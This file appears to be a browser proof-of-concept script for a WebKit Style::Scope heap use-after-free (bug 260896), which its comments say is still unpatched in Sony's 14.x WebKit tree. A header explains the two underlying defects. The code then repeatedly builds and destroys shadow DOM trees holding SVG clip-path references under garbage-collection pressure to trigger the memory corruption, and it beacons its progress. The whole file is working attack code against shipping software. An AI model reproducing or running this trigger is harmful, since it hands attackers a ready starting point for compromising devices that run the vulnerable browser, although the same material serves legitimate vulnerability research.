// Style::Scope use-after-free — WebKit bug 260896, live in Sony's 14.x tree.
//
// Upstream fixed this on 2023-11-02 (bug 260896, rdar://114231775), i.e. AFTER the
// snapshot Sony ships. Two independent defects, both still present in the drop:
//
//   WebCore/rendering/PathOperation.cpp:57-65
//       ReferencePathOperation keeps a RefPtr<SVGElement> m_element that nothing uses.
//       A RenderStyle can hold a PathOperation, so this is a RenderStyle -> DOM
//       ownership cycle: the SVG element outlives the style that referenced it.
//
//   WebCore/style/StyleScope.cpp  Scope::~Scope()
//       { ASSERT(!hasPendingSheets()); }   -- and nothing else
//       Upstream added weakPtrFactory().revokeAll() as the first line, because a Scope
//       that dies while weak pointers to it are alive leaves those pointers dangling.
//
// Together: tear down a shadow tree holding an SVG style reference, and the Scope can be
// destroyed while something still holds a weak pointer into it -> heap-use-after-free in
// Style::Scope::removeStyleSheetCandidateNode (that is the function in the crash title).
//
// Upstream's reproducer is a fuzzer artefact: attachShadow, an SVG with a clip-path url()
// reference, a layout touch, then GC. This is the same sequence built from script so it
// fits the probe harness, which only injects a <script> into a page.

(function () {
  const NS = 'http://www.w3.org/2000/svg';
  const fire = (tag) => { try { navigator.sendBeacon('/beacon/' + tag + '?t=' + Date.now()); } catch (e) {} };
  const out = (s) => {
    try {
      let el = document.getElementById('log');
      if (!el) {
        el = document.createElement('pre');
        el.id = 'log';
        el.style.cssText = 'position:fixed;left:0;top:0;z-index:99999;background:#000;color:#0f0;font:12px monospace;margin:0;padding:6px;white-space:pre-wrap';
        (document.body || document.documentElement).appendChild(el);
      }
      el.textContent += s + '\n';
    } catch (e) {}
  };

  let supported = true;
  try {
    const t = document.createElement('div');
    t.attachShadow({ mode: 'open' });
  } catch (e) {
    supported = false;
    out('attachShadow unavailable: ' + e);
    fire('SCOPE-NO-SHADOW');
    return;
  }

  let iterations = 0;
  const TOTAL = 300;

  function buildOnce(i) {
    // A detached-then-attached host, so the shadow root and its style scope are created
    // and destroyed the way the fuzzer case destroyed them.
    const host = document.createElement('div');
    host.setAttribute('tabindex', '-1');
    document.body.appendChild(host);

    const sr = host.attachShadow({ mode: 'open', delegatesFocus: false });
    const svg = document.createElementNS(NS, 'svg');
    svg.setAttribute('width', '64');
    svg.setAttribute('height', '64');
    svg.id = 'svg' + i;

    // the reference target: a clipPath the style will point at by url()
    const clip = document.createElementNS(NS, 'clipPath');
    clip.id = 'clip' + i;
    clip.setAttribute('clipPathUnits', 'userSpaceOnUse');
    const inner = document.createElementNS(NS, 'rect');
    inner.setAttribute('width', '8');
    inner.setAttribute('height', '8');
    clip.appendChild(inner);

    // the element that creates a ReferencePathOperation in its RenderStyle
    const target = document.createElementNS(NS, 'rect');
    target.setAttribute('width', '64');
    target.setAttribute('height', '64');
    target.setAttribute('clip-path', 'url(#clip' + i + ')');
    target.style.clipPath = 'url(#clip' + i + ')';

    svg.appendChild(clip);
    svg.appendChild(target);
    sr.appendChild(svg);

    // force style resolution + layout while the scope is alive
    void host.offsetHeight;
    void svg.getBoundingClientRect().width;
    void host.scrollTop;

    // tear the tree down; the Scope dies here
    host.remove();

    // GC pressure: the fuzzer case relies on collection to run the destructor chain
    for (let k = 0; k < 48; k++) new Uint8Array(128 * 1024);
  }

  function step() {
    const chunk = 10;
    for (let n = 0; n < chunk && iterations < TOTAL; n++, iterations++) {
      buildOnce(iterations);
    }
    out('iterations: ' + iterations);
    fire('SCOPE-ITER-' + iterations);
    if (iterations < TOTAL) {
      setTimeout(step, 0);
    } else {
      out('survived ' + TOTAL + ' tears');
      fire('SCOPE-SURVIVED');
    }
  }

  out('shadow dom ok; starting ' + TOTAL + ' iterations');
  fire('SCOPE-BOOT');
  setTimeout(step, 0);
})();
